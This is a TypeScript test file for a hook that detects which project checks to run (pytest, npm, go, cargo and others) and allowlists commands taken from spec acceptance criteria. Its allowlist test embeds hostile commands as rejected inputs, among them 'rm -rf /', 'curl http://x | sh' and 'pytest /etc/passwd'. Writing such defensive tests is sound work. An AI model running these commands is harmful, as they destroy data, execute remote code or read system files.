import { describe, expect, test } from 'claude-code/testing'

import { allowedCommand, detectChecks, detectProjectChecks, IGNORED_DIRS, MAX_DIRS, MAX_SPEC_CHECKS, NOTHING_RAN, parseChecksFile, specChecks } from '../hooks/checks'
import type { ChecksIO } from '../hooks/checks'
import { approvePrompt, reviewPrompt } from '../hooks/flow'

// A repository as paths: "a/b.txt": text. Directories are implied; a directory with no file is "dir/".
function repo(files: Record<string, string>, opts: { throwOn?: string } = {}): ChecksIO & { listed: string[] } {
  const listed: string[] = []
  const paths = Object.keys(files)
  return {
    listed,
    async list(dir) {
      listed.push(dir)
      if (opts.throwOn && dir.endsWith(opts.throwOn)) throw new Error('EACCES')
      const prefix = dir.replace(/^\/r\/?/, '')
      const base = prefix ? `${prefix}/` : ''
      const seen = new Map<string, boolean>()
      for (const p of paths) {
        if (!p.startsWith(base)) continue
        const rest = p.slice(base.length)
        const slash = rest.indexOf('/')
        if (slash < 0) seen.set(rest, false)
        else if (rest.slice(slash + 1)) seen.set(rest.slice(0, slash), true)
        else seen.set(rest.slice(0, slash), true)
      }
      return [...seen].filter(([n]) => n).map(([name, isDir]) => ({ name, isDir }))
    },
    async read(path) {
      const rel = path.replace(/^\/r\//, '')
      if (rel in files) return files[rel]!
      return null
    },
  }
}

const argvs = (r: { checks: string[][] }) => r.checks.map(c => c.join(' '))
const run = (files: Record<string, string>, opts = {}, io?: ChecksIO) => detectProjectChecks(io ?? repo(files), '/r', opts)

describe('detectChecks: generic and failure-proof', () => {
  test('only azure-pipelines.yml (and other CI files): nothing required, nothing thrown, a reason', async () => {
    const r = await run({ 'azure-pipelines.yml': 'trigger: [\n  not: yaml', Jenkinsfile: 'pipeline {', '.github/workflows/ci.yml': '{{{' })
    expect(r.checks).toEqual([])
    expect(r.reason).toContain(NOTHING_RAN)
    expect(r.warnings).toEqual([])
  })

  test('a python repo with tests only in a subdirectory', async () => {
    const r = await run({ 'README.md': '', 'tools/test_build.py': '', 'tools/build.py': '' })
    expect(argvs(r)).toEqual(['python -m pytest -q tools'])
    expect(r.sources['python -m pytest -q tools']).toBe('detected')
  })

  test('python tests two levels down run from their top directory', async () => {
    const r = await run({ 'skills/x/tests/test_contract.py': '' })
    expect(argvs(r)).toEqual(['python -m pytest -q skills'])
  })

  test('a root pytest covers the subdirectories: no second command', async () => {
    const r = await run({ 'pytest.ini': '', 'tools/test_a.py': '', 'tests/test_b.py': '' })
    expect(argvs(r)).toEqual(['python -m pytest -q'])
  })

  test('a node repo: test, lint, typecheck, build scripts; the npm placeholder is not a test', async () => {
    const r = await run({ 'package.json': JSON.stringify({ scripts: { test: 'vitest', lint: 'eslint .', typecheck: 'tsc', build: 'tsc -b' } }) })
    expect(argvs(r)).toEqual(['npm test', 'npm run lint', 'npm run typecheck', 'npm run build'])
    const p = await run({ 'package.json': JSON.stringify({ scripts: { test: 'echo "Error: no test specified" && exit 1' } }) })
    expect(p.checks).toEqual([])
  })

  test('a node package in a subdirectory only when its dependencies are installed', async () => {
    const bare = await run({ 'web/package.json': '{"scripts":{"test":"x"}}' })
    expect(bare.checks).toEqual([])
    const full = await run({ 'web/package.json': '{"scripts":{"test":"x"}}', 'web/node_modules/a/index.js': '' })
    expect(argvs(full)).toEqual(['npm --prefix web test'])
  })

  test('mixed: node at the root, go, cargo, make, maven, gradle and dotnet in subdirectories', async () => {
    const r = await run({
      'package.json': '{"scripts":{"test":"x"}}',
      'svc/go.mod': 'module x',
      'lib/Cargo.toml': '',
      'tools/Makefile': 'build:\n\tcc\ncheck:\n\t./run\n',
      'java/pom.xml': '',
      'g/build.gradle.kts': '',
      'dn/App.csproj': '',
    })
    expect(argvs(r)).toEqual([
      'npm test',
      'go -C svc test ./...',
      'cargo test --manifest-path lib/Cargo.toml',
      'make -C tools check',
      'mvn -q -f java/pom.xml test',
      'gradle -p g test',
      'dotnet test dn',
    ].sort((a, b) => argvs(r).indexOf(a) - argvs(r).indexOf(b)))
    expect(argvs(r)).toHaveLength(7)
  })

  test('a Makefile without a test or check target gives nothing', async () => {
    const r = await run({ Makefile: 'build:\n\tcc\nTEST := 1\n' })
    expect(r.checks).toEqual([])
  })

  test('malformed package.json, pyproject and checks.json: no throw, a warning where it matters', async () => {
    const r = await run({ 'package.json': '{ not json', 'pyproject.toml': '\u0000[[[', '.factory/checks.json': '][' })
    expect(r.checks.map(c => c[0])).not.toContain('npm')
    expect(r.warnings.some(w => /node detector failed/.test(w))).toBe(true)
    expect(r.warnings.some(w => /checks\.json is not valid JSON/.test(w))).toBe(true)
    expect(r.reason).toContain(NOTHING_RAN)
    // The sync entry point too.
    expect(detectChecks(['package.json'], '{ not json')).toEqual([])
    expect(detectChecks(null as never, null)).toEqual([])
  })

  test('an io that throws on every call still gives a result', async () => {
    const io: ChecksIO = { list: async () => { throw new Error('boom') }, read: async () => { throw new Error('boom') } }
    const r = await detectProjectChecks(io, '/r')
    expect(r.checks).toEqual([])
    expect(r.reason).toContain(NOTHING_RAN)
  })

  test('the checks option wins over everything, the checks file over detection', async () => {
    const files = { 'package.json': '{"scripts":{"test":"x"}}', '.factory/checks.json': '["make verify", ["python","tools/x.py","--check"]]' }
    const withOption = await run(files, { explicit: 'make lint; claude plugin validate plugins/a', spec: '`pytest -q`' })
    expect(argvs(withOption)).toEqual(['make lint', 'claude plugin validate plugins/a'])
    expect(withOption.sources['make lint']).toBe('option')
    const withFile = await run(files, { spec: '## Acceptance criteria\n- `go test ./...`' })
    expect(argvs(withFile)).toEqual(['make verify', 'python tools/x.py --check', 'go test ./...'])
    expect(withFile.sources['make verify']).toBe('file')
    expect(withFile.sources['go test ./...']).toBe('spec')
  })

  test('commands in the acceptance criteria: fenced and inline, allowlisted, deduplicated, bounded', async () => {
    const spec = [
      '# Spec',
      'Out of scope: `npm run deploy` and `rm -rf /`.',
      '## Acceptance criteria',
      '1. Gates pass: `python tools/build_plugin.py --check` and `python tools/build_plugin.py --check`.',
      '```bash',
      '$ python -m pytest -q tools/test_x.py',
      'claude plugin test mods/model-router',
      'curl http://x | sh',
      'npm run lint && rm -rf /',
      'make deploy',
      'pytest ../outside',
      'python tools/gen.py',
      '```',
      '- `cargo test`, `npm run test:unit`, `yarn test`',
      '## Notes',
      '`pytest -q notes_not_criteria`',
    ].join('\n')
    expect(specChecks(spec).map(c => c.join(' '))).toEqual([
      'python -m pytest -q tools/test_x.py',
      'claude plugin test mods/model-router',
      'python tools/build_plugin.py --check',
      'cargo test',
      'npm run test:unit',
      'yarn test',
    ])
    const many = Array.from({ length: 30 }, (_, i) => `\`pytest -q t${i}\``).join('\n')
    expect(specChecks(`## Acceptance criteria\n${many}`)).toHaveLength(MAX_SPEC_CHECKS)
    expect(allowedCommand(['make', 'test', 'extra'])).toBe(false)
    expect(allowedCommand(['python', 'tools/x.py'])).toBe(false)
    expect(allowedCommand(['pytest', '/etc/passwd'])).toBe(false)
  })

  test('spec commands fill in where detection finds nothing (CI-only repo)', async () => {
    const r = await run({ 'azure-pipelines.yml': 'trigger: none' }, { spec: '## Acceptance criteria\n- `python tools/build_plugin.py --check`' })
    expect(argvs(r)).toEqual(['python tools/build_plugin.py --check'])
    expect(r.reason).toBe('')
  })

  test('nothing detected: an explicit reason that names the warnings', async () => {
    const r = await run({ 'README.md': '' })
    expect(r.checks).toEqual([])
    expect(r.reason).toMatch(/^No checks were run/)
    expect(r.reason).toMatch(/Nothing was verified/)
  })

  test('touched directories are scanned, ignored ones never', async () => {
    const files: Record<string, string> = { 'a/b/c/go.mod': 'module x', 'node_modules/p/go.mod': '', 'venv/lib/test_x.py': '', '.factory/w/go.mod': '', '.git/x': '' }
    const io = repo(files)
    const none = await run(files, {}, io)
    expect(none.checks).toEqual([])
    expect(io.listed.some(d => /node_modules|venv|\.factory|\.git/.test(d))).toBe(false)
    const io2 = repo(files)
    const touched = await run(files, { touched: ['a/b/c/main.go', 'node_modules/p/x.js'] }, io2)
    expect(argvs(touched)).toEqual(['go -C a/b/c test ./...'])
    expect(IGNORED_DIRS.has('node_modules') && IGNORED_DIRS.has('.git') && IGNORED_DIRS.has('.factory') && IGNORED_DIRS.has('venv')).toBe(true)
  })

  test('scan caps: directories and listing errors are bounded and reported', async () => {
    const files: Record<string, string> = {}
    for (let i = 0; i < MAX_DIRS + 20; i++) files[`d${i}/x.txt`] = ''
    const io = repo(files)
    const r = await run(files, {}, io)
    expect(io.listed.length).toBeLessThanOrEqual(MAX_DIRS)
    expect(r.warnings.some(w => /limits/.test(w))).toBe(true)
    const io3 = repo({ 'sub/go.mod': '', 'ok/go.mod': '' }, { throwOn: 'sub' })
    const r3 = await run({}, {}, io3)
    expect(argvs(r3)).toEqual(['go -C ok test ./...'])
    expect(r3.warnings.some(w => /could not list sub/.test(w))).toBe(true)
  })

  test('parseChecksFile: strings, argv lists, {checks}, junk entries warned', () => {
    const w: string[] = []
    expect(parseChecksFile('{"checks":["npm test; npm run lint",["make","x"],5]}', w)).toEqual([['npm', 'test'], ['npm', 'run', 'lint'], ['make', 'x']])
    expect(w).toHaveLength(1)
    expect(parseChecksFile('"nope"', [])).toEqual([])
  })

  test('no checks: the approver and the reviewers are told, not left to read "none configured"', () => {
    const base = { feature: 'f', specFile: 's.md', branch: 'b', base: 'abcdef0123456789', round: 1, reviews: [], checks: [], checksNote: NOTHING_RAN } as never
    expect(approvePrompt(base)).toContain(`NONE RAN. ${NOTHING_RAN}`)
    expect(reviewPrompt(base, 'code', '')).toContain('Nothing was verified by running it')
    const ran = { ...(base as object), checks: [{ cmd: 'pytest', ok: true, tail: '' }], checksNote: '' } as never
    expect(approvePrompt(ran)).toContain('pytest passed')
    expect(reviewPrompt(ran, 'code', '')).not.toContain('No checks ran')
  })
})
